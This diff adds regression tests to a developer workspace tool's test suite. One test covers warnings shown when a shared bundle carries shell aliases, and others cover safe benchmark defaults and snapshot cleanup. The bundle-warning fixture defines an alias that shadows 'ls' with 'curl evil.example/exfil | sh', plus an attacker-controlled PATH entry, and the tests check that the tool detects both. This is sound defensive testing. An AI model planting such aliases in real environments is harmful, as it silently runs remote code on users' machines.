@@ -7,7 +7,7 @@ import { createWorkspace, saveWorkspace, getWorkspace, deleteWorkspace, getActiv
 import { switchToWorkspace } from "../src/core/workspace/switcher.js";
 import { createSnapshot, listSnapshots } from "../src/core/workspace/snapshot.js";
 import { getWorkspaceMetadata, formatMetadataSummary } from "../src/core/workspace/metadata.js";
-import { verifyWorkspaceStructured, formatStructuredVerification, previewSwitch, formatSwitchPreview, diffWorkspaces, formatWorkspaceDiff, computeWorkspaceHealth, formatHealthScore, previewBundleImport } from "../src/core/workspace/verification.js";
+import { verifyWorkspaceStructured, formatStructuredVerification, previewSwitch, formatSwitchPreview, diffWorkspaces, formatWorkspaceDiff, computeWorkspaceHealth, formatHealthScore, previewBundleImport, formatBundlePreview } from "../src/core/workspace/verification.js";
 import { benchmarkWorkspace, formatBenchmarkResult } from "../src/core/workspace/benchmark.js";
 import { exportWorkspaceBundle, importWorkspaceBundle } from "../src/core/workspace/bundle.js";
 import { CURRENT_SCHEMA_VERSION } from "../src/core/workspace/schema.js";
@@ -280,6 +280,43 @@ test("previewBundleImport shows what would be imported without importing", async
         assert.ok(preview.checksum.verified !== null, "checksum should be checked");
         assert.ok(preview.checksum.verified, "checksum should match");
         assert.equal(preview.conflicts.existingWorkspace, true, "acme already exists");
+        assert.deepEqual(preview.shellRisks, [], "a workspace with no aliases/functions/pathAdditions has no shell risks");
+    });
+});
+
+// Regression test: a workspace bundle can carry shell.aliases/functions/
+// pathAdditions - real, unattended shell code that runs the instant
+// 'workspace switch' sources workspace-shell.sh. Since bundle export/
+// import is explicitly built for sharing between machines/people, an
+// imported bundle from someone else is the sharpest place this matters -
+// both the preview and the real import must surface it clearly rather
+// than silently importing arbitrary shell code with no review signal.
+test("previewBundleImport and importWorkspaceBundle both surface a clear warning when a bundle declares shell aliases/functions/pathAdditions", async () => {
+    await withTempHome(async (tempHome) => {
+        let doc = createWorkspace({ name: "shared-bundle", description: "x" });
+        doc = {
+            ...doc,
+            shell: {
+                aliases: { ls: "curl evil.example/exfil | sh; ls" },
+                functions: { greet: "echo hi" },
+                pathAdditions: ["/tmp/attacker-controlled"]
+            }
+        };
+        saveWorkspace(doc);
+
+        const outDir = path.join(tempHome, "exports");
+        const { archivePath } = await exportWorkspaceBundle("shared-bundle", outDir);
+
+        const preview = await previewBundleImport(archivePath, { newName: "shared-bundle-preview" });
+        assert.equal(preview.shellRisks.length, 3);
+        assert.ok(preview.shellRisks.some((r) => r.includes("alias") && r.includes("ls")));
+        assert.ok(preview.shellRisks.some((r) => r.includes("function") && r.includes("greet")));
+        assert.ok(preview.shellRisks.some((r) => r.includes("PATH") && r.includes("/tmp/attacker-controlled")));
+        const formatted = formatBundlePreview(preview).join("\n");
+        assert.match(formatted, /review before importing/i);
+
+        const result = await importWorkspaceBundle(archivePath, { newName: "shared-bundle-imported" });
+        assert.equal(result.shellRisks.length, 3);
     });
 });
 
@@ -298,6 +335,57 @@ test("benchmarkWorkspace measures core operations", async () => {
             assert.ok(r.durationMs >= 0, "duration should be non-negative");
             assert.equal(r.runs, 1);
         }
+    });
+});
+
+// Regression test for a real bug: `devforgekit workspace benchmark <name>`
+// used to default to running EVERY operation, including "switch" and
+// "restore" - both of which re-apply the workspace's live state for
+// real (git config --global, ~/.ssh/config Host blocks, docker/k8s
+// context, cloud CLI profile). A user running a plain "how fast is
+// this" benchmark would silently have their machine's real active
+// identity switched to whatever workspace they benchmarked, with no
+// flag needed to opt in. The default must now be limited to operations
+// confirmed to never touch live machine state.
+test("benchmarkWorkspace with no operations override only runs the safe, read-only subset by default", async () => {
+    await withTempHome(async () => {
+        createWorkspace({ name: "acme", description: "x" });
+        const result = await benchmarkWorkspace("acme", { runs: 1 });
+        const ranOps = result.results.map((r) => r.operation).sort();
+        assert.deepEqual(ranOps, ["diff", "health", "metadata", "verify"]);
+        assert.ok(!ranOps.includes("switch"), "switch must never run unless explicitly requested via --ops");
+        assert.ok(!ranOps.includes("restore"), "restore must never run unless explicitly requested via --ops");
+    });
+});
+
+test("benchmarkWorkspace still allows switch/restore/snapshot/bundle operations when explicitly requested via operations", async () => {
+    await withTempHome(async () => {
+        createWorkspace({ name: "acme", description: "x" });
+        const result = await benchmarkWorkspace("acme", {
+            operations: ["snapshot", "switch"],
+            runs: 1,
+        });
+        assert.deepEqual(result.results.map((r) => r.operation), ["snapshot", "switch"]);
+        assert.equal(result.summary.passed, 2);
+    });
+});
+
+// Regression test for a second real bug found in the same review: the
+// snapshot cleanup loop after a "snapshot"/"restore" benchmark run was
+// a no-op (empty try block with a stale comment claiming cleanup
+// happened elsewhere) - every benchmark run left real, permanent
+// snapshot files behind. Snapshots created during benchmarking must be
+// deleted again once timing is captured.
+test("benchmarkWorkspace's 'snapshot' operation cleans up the snapshots it creates, leaving no permanent artifacts", async () => {
+    await withTempHome(async () => {
+        createWorkspace({ name: "acme", description: "x" });
+        const { listSnapshots } = await import("../src/core/workspace/snapshot.js");
+        const before = listSnapshots("acme").length;
+
+        await benchmarkWorkspace("acme", { operations: ["snapshot"], runs: 3 });
+
+        const after = listSnapshots("acme").length;
+        assert.equal(after, before, "benchmarking 'snapshot' 3 times must not leave any snapshots behind");
     });
 });
 
